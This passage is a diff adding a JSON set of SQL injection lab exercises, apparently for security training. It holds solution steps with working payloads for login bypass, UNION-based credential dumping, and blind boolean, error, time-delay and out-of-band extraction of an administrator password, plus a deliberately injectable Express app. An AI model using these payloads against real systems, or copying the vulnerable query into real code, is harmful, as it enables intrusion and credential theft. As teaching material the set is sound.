@@ -1,0 +1,1153 @@
+[
+  {
+    "Lab scenario": "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Modify the category parameter, giving it the value '+OR+1=1--",
+      "3.Submit the request, and verify that the response now contains one or more unreleased products."
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create products table with released flag\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT, released INTEGER)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Teddy Bear', 'Gifts', 1)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Secret Item', 'Gifts', 0)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Tech Gadget', 'Electronics', 1)\");\n});\n\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>Product Search</h1>\n    <form method=\"GET\" action=\"/products\">\n      <label for=\"category\">Category:</label>\n      <input type=\"text\" id=\"category\" name=\"category\" value=\"Gifts\">\n      <button type=\"submit\">Show Products</button>\n    </form>\n  `);\n});\n\n// Vulnerable product route\napp.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products WHERE category = '${category}' AND released = 1`;\n\n  console.log(\"Executing query:\", query);\n  \n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error fetching products\");\n    } else {\n      res.send(`\n        <h2>Products in ${category}</h2>\n        <ul>\n          ${rows.map(p => `<li>${p.name}</li>`).join('')}\n        </ul>\n      `);\n    }\n  });\n});\n\n// Start server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
+  },
+  {
+    "Lab scenario": "SQL injection vulnerability allowing login bypass",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the login request.",
+      "2.Modify the username parameter, giving it the value: administrator'--"
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection attack, querying the database type and version on Oracle",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:",
+      "3.'+UNION+SELECT+'abc','def'+FROM+dual--",
+      "4.Use the following payload to display the database version:",
+      "5.'+UNION+SELECT+BANNER,+NULL+FROM+v$version--"
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection attack, querying the database type and version on MySQL and Microsoft",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:",
+      "3.'+UNION+SELECT+'abc','def'#",
+      "4.Use the following payload to display the database version:",
+      "5.'+UNION+SELECT+@@version,+NULL#"
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection attack, listing the database contents on non-Oracle databases",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:",
+      "3.'+UNION+SELECT+'abc','def'--",
+      "4.Use the following payload to retrieve the list of tables in the database:",
+      "5.'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--",
+      "6.Find the name of the table containing user credentials.",
+      "7.Use the following payload (replacing the table name) to retrieve the details of the columns in the table:",
+      "8.'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--",
+      "9.Find the names of the columns containing usernames and passwords.",
+      "10.Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:",
+      "11.'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--",
+      "12.Find the password for the administrator user, and use it to log in."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection attack, listing the database contents on Oracle",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:",
+      "3.'+UNION+SELECT+'abc','def'+FROM+dual--",
+      "4.Use the following payload to retrieve the list of tables in the database:",
+      "5.'+UNION+SELECT+table_name,NULL+FROM+all_tables--",
+      "6.Find the name of the table containing user credentials.",
+      "7.Use the following payload (replacing the table name) to retrieve the details of the columns in the table:",
+      "8.'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--",
+      "9.Find the names of the columns containing usernames and passwords.",
+      "10.Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:",
+      "11.'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--",
+      "12.Find the password for the administrator user, and use it to log in."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection UNION attack, determining the number of columns returned by the query",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.\nTo solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.",
+      "3.Modify the category parameter to add an additional column containing a null value:",
+      "4.'+UNION+SELECT+NULL,NULL--",
+      "5.Continue adding null values until the error disappears and the response includes additional content containing the null values."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection UNION attack, finding a column containing text",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.\nThe lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:",
+      "3.'+UNION+SELECT+NULL,NULL,NULL--",
+      "4.Try replacing each null with the random value provided by the lab, for example:",
+      "5.'+UNION+SELECT+'abcdef',NULL,NULL--",
+      "6.If an error occurs, move on to the next null and try that instead."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection UNION attack, retrieving data from other tables",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:",
+      "3.'+UNION+SELECT+'abc','def'--",
+      "4.Use the following payload to retrieve the contents of the users table:",
+      "5.'+UNION+SELECT+username,+password+FROM+users--",
+      "6.Verify that the application's response contains usernames and passwords."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection UNION attack, retrieving multiple values in a single column",
+    "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Use Burp Suite to intercept and modify the request that sets the product category filter.",
+      "2.Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:",
+      "3.'+UNION+SELECT+NULL,'abc'--",
+      "4.Use the following payload to retrieve the contents of the users table:",
+      "5.'+UNION+SELECT+NULL,username||'~'||password+FROM+users--",
+      "6.Verify that the application's response contains usernames and passwords."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Blind SQL injection with conditional responses",
+    "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.",
+      "2.Modify the TrackingId cookie, changing it to:",
+      "3.TrackingId=xyz' AND '1'='1",
+      "4.Verify that the Welcome back message appears in the response.",
+      "5.Now change it to:",
+      "6.TrackingId=xyz' AND '1'='2",
+      "7.Verify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.",
+      "8.Now change it to:",
+      "9.TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a",
+      "10.Verify that the condition is true, confirming that there is a table called users.",
+      "11.Now change it to:",
+      "12.TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a",
+      "13.Verify that the condition is true, confirming that there is a user called administrator.",
+      "14.The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:",
+      "15.TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a",
+      "16.This condition should be true, confirming that the password is greater than 1 character in length.",
+      "17.Send a series of follow-up values to test different password lengths. Send:",
+      "18.TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a",
+      "19.Then send:",
+      "20.TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a",
+      "21.And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the",
+      "22.Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.",
+      "23.After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.",
+      "24.In Burp Intruder, change the value of the cookie to:",
+      "25.TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a",
+      "26.This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.",
+      "27.Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers):",
+      "28.TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§",
+      "29.To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the",
+      "30.Payloads side panel, check that Simple list is selected, and under",
+      "31.Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.",
+      "32.To be able to tell when the correct character was submitted, you'll need to grep each response for the expression",
+      "33.Welcome back. To do this, click on the",
+      "34.Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.",
+      "35.Launch the attack by clicking the  Start attack button.",
+      "36.Review the attack results to find the value of the character at the first position. You should see a column in the results called Welcome back. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.",
+      "37.Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:",
+      "38.TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a",
+      "39.Launch the modified attack, review the results, and note the character at the second offset.",
+      "40.Continue this process testing offset 3, 4, and so on, until you have the whole password.",
+      "41.In the browser, click My account to open the login page. Use the password to log in as the administrator user.",
+      "42.Note",
+      "43.For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the cluster bomb attack type, and work through all permutations of offsets and character values."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Blind SQL injection with conditional errors",
+    "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.",
+      "2.Modify the TrackingId cookie, appending a single quotation mark to it:",
+      "3.TrackingId=xyz'",
+      "4.Verify that an error message is received.",
+      "5.Now change it to two quotation marks:",
+      "6.TrackingId=xyz''",
+      "7.Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.",
+      "8.You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:",
+      "9.TrackingId=xyz'||(SELECT '')||'",
+      "10.In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:",
+      "11.TrackingId=xyz'||(SELECT '' FROM dual)||'",
+      "12.As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.",
+      "13.Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:",
+      "14.TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'",
+      "15.This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.",
+      "16.As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:",
+      "17.TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'",
+      "18.As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.",
+      "19.You can also exploit this behavior to test conditions. First, submit the following query:",
+      "20.TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+      "21.Verify that an error message is received.",
+      "22.Now change it to:",
+      "23.TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+      "24.Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.",
+      "25.You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:",
+      "26.TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "27.Verify that the condition is true (the error is received), confirming that there is a user called administrator.",
+      "28.The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:",
+      "29.TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "30.This condition should be true, confirming that the password is greater than 1 character in length.",
+      "31.Send a series of follow-up values to test different password lengths. Send:",
+      "32.TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "33.Then send:",
+      "34.TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "35.And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.",
+      "36.After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.",
+      "37.Go to Burp Intruder and change the value of the cookie to:",
+      "38.TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "39.This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.",
+      "40.Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the",
+      "41.\"Add §\" button. You should then see the following as the cookie value (note the payload position markers):",
+      "42.TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "43.To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the \"Payloads\" side panel, check that \"Simple list\" is selected, and under \"Payload configuration\" add the payloads in the range a - z and 0 - 9. You can select these easily using the \"Add from list\" drop-down.",
+      "44.Launch the attack by clicking the \" Start attack\" button.",
+      "45.Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The \"Status\" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.",
+      "46.Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:",
+      "47.TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+      "48.Launch the modified attack, review the results, and note the character at the second offset.",
+      "49.Continue this process testing offset 3, 4, and so on, until you have the whole password.",
+      "50.In the browser, click \"My account\" to open the login page. Use the password to log in as the administrator user."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Visible error-based SQL injection",
+    "Lab Description": "This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.\nThe database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Using Burp's built-in browser, explore the lab functionality.",
+      "2.Go to the Proxy > HTTP history tab and find a GET / request that contains a TrackingId cookie.",
+      "3.In Repeater, append a single quote to the value of your TrackingId cookie and send the request.",
+      "4.TrackingId=ogAZZfxtOKUELbuJ'",
+      "5.In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.",
+      "6.In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:",
+      "7.TrackingId=ogAZZfxtOKUELbuJ'--",
+      "8.Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.",
+      "9.Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:",
+      "10.TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--",
+      "11.Send the request. Observe that you now get a different error saying that an AND condition must be a boolean expression.",
+      "12.Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:",
+      "13.TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--",
+      "14.Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.",
+      "15.Adapt your generic SELECT statement so that it retrieves usernames from the database:",
+      "16.TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--",
+      "17.Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.",
+      "18.Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request.",
+      "19.TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--",
+      "20.Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.",
+      "21.Modify the query to return only one row:",
+      "22.TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--",
+      "23.Send the request. Observe that the error message now leaks the first username from the users table:",
+      "24.ERROR: invalid input syntax for type integer: \"administrator\"",
+      "25.Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:",
+      "26.TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
+      "27.Log in as administrator using the stolen password to solve the lab."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Blind SQL injection with time delays",
+    "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nTo solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.",
+      "2.Modify the TrackingId cookie, changing it to:",
+      "3.TrackingId=x'||pg_sleep(10)--",
+      "4.Submit the request and observe that the application takes 10 seconds to respond."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Blind SQL injection with time delays and information retrieval",
+    "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.",
+      "2.Modify the TrackingId cookie, changing it to:",
+      "3.TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--",
+      "4.Verify that the application takes 10 seconds to respond.",
+      "5.Now change it to:",
+      "6.TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--",
+      "7.Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.",
+      "8.Now change it to:",
+      "9.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "10.Verify that the condition is true, confirming that there is a user called administrator.",
+      "11.The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:",
+      "12.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "13.This condition should be true, confirming that the password is greater than 1 character in length.",
+      "14.Send a series of follow-up values to test different password lengths. Send:",
+      "15.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "16.Then send:",
+      "17.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "18.And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.",
+      "19.After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.",
+      "20.In Burp Intruder, change the value of the cookie to:",
+      "21.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "22.This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.",
+      "23.Place payload position markers around the a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers):",
+      "24.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "25.To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the",
+      "26.Payloads side panel, check that Simple list is selected, and under",
+      "27.Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.",
+      "28.To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the  Resource pool tab to open the Resource pool side panel and add the attack to a resource pool with the",
+      "29.Maximum concurrent requests set to 1.",
+      "30.Launch the attack by clicking the  Start attack button.",
+      "31.Review the attack results to find the value of the character at the first position. You should see a column in the results called Response received. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.",
+      "32.Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:",
+      "33.TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+      "34.Launch the modified attack, review the results, and note the character at the second offset.",
+      "35.Continue this process testing offset 3, 4, and so on, until you have the whole password.",
+      "36.In the browser, click My account to open the login page. Use the password to log in as the administrator user."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Blind SQL injection with out-of-band interaction",
+    "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.\nTo solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.",
+      "2.Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:",
+      "3.TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLABORATOR-SUBDOMAIN/\">+%25remote%3b]>'),'/l')+FROM+dual--",
+      "4.Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.",
